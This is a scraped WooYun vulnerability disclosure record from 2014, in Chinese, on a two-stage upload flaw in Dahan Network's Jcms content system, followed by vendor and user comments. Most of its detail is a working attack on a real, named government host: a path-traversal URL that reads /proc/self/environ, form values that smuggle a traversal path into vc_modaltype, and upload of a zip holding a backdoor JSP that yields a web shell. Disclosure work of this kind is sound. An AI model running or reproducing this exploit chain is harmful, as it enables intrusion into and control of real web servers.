{"id": 48358, "wybug_id": "wooyun-2014-079069", "wybug_title": "大汉网络Jcms二次上传Getshell", "wybug_corp": "南京大汉网络有限公司", "wybug_author": "矿主", "wybug_date": "2014-10-12 15:48", "wybug_open_date": "2014-12-30 14:44", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件上传"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-10-12：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-10-13：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-12-07：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-17：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-27：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-30：\t细节向公众公开  简要描述： 大汉网络Jcms二次上传Getshell. 详细说明：  这段程序漏洞的逻辑比较复杂，下面代码分析：jcms/m_5_e/module/opr_updatemodule.jsp\n... ...//上传文件CommonUploadFile upload = new CommonUploadFile( strTemp ,null);upload.uploadFile(request);String[] strFileName = upload.getAllFileName();que_hiddenvalue = upload.getFormValue(\"que_hiddenvalue\");... ...//两个参数，通过表单获取。modalType = upload.getFormValue(\"vc_modaltype\");int i_updatetype = Convert.getStringValueInt(upload.getFormValue(\"c_updatetype_hid\"));... .../*将文件解压到解压目录*/zf.unzip( true,strTemp + strFileName[0],strUnzipFile );... ...//设置表单c_updatetype_hid=1，进入此判断if (1 == i_updatetype || 0 == i_updatetype){ //第一次上传modalType为空，上传文件被解压到strUnzipFile，拷贝到strModalPath，但是strModalPath不在web目录中 //第二次上传modalType设置为web目录，解压目录strUnzipFile+modalType的路径就会不存在，所以第一次上传为的是先把文件放上去 //第二次把已经上传好的文件，拷贝到strModalPath + modalType构造的web目录，就ok了。 bl = blf.updateModuleFileToWeb( strModalPath + modalType +\"/\",strUnzipFile+modalType+\"/\" );}... ...\n   漏洞证明：  首先通过文件读取漏洞获取web目录http://news.jc.gansu.gov.cn/jcms/jcms_files/jcms1/web1/site/module/oss/downfile.jsp?filename=a.txt&pathfile=media/-1/....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//proc/self/environ \n\n得到web目录：CLASSPATH=/soft/tomcat/bin/bootstrap.jar /soft/tomcat/webapps/jcms/ 第一次构造上传http://news.jc.gansu.gov.cn/jcms/m_5_e/module/opr_updatemodule.jsp 编辑表单 c_updatetype_hid = 1 \n\n构造zip包: soft.zip 目录结构如下：j.jsp为后门文件。（必须满足这个结构才能上传成功）\n\n点击上传，上传文件解压后存在于wei目录之外。第二次构造上传http://news.jc.gansu.gov.cn/jcms/m_5_e/module/opr_updatemodule.jsp 编辑表单c_updatetype_hid = 1 vc_modaltype = ../soft/tomcat/webapps/jcms/ 使用上面得到的web目录\n\n第二次上传同一个zip包，这次上传其实是无效的，目的是通过vc_modaltype传递web目录，将第一次生成的文件拷贝到web目录中。 访问http://news.jc.gansu.gov.cn/jcms/j.jsp GetShell\n\n   修复方案：  严格限制上传文件名。   版权声明：转载请注明来源 矿主@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-12-30 14:44 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-10-13 20:11 |    \t\tAzui \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:10        | 用一只黑色铅笔画一出舞台默剧。)\t\t \n  不是公开了么- -    \n     2014-10-13 20:53 |    \t\t贫道来自河北 \t\t\t( 普通白帽子  |\t\t\t        Rank:1395 漏洞数:423        | 一个立志要把乌云集市变成零食店的男人)\t\t \n  恭喜忽略    \n     2014-10-15 07:24 |    \t\tsansboy \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:1        | 一个致力于看妹纸隐藏相册的苦逼攻城狮！)\t\t \n  忽略怎么看不到？    \n     2014-11-23 03:46 |    \t\tCrocus \t\t\t( 路人 |\t\t\t        Rank:7 漏洞数:2        | 低调求发展)\t\t \n  config.xml内容是啥    \n     2015-01-04 08:56 |    \t\tzzR  \t\t\t( 核心白帽子 |\t\t\t        Rank:1382 漏洞数:122        | 收wb   1：5 无限量收   [平台担保])\t\t \n  这个为啥能忽略了！！！！    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}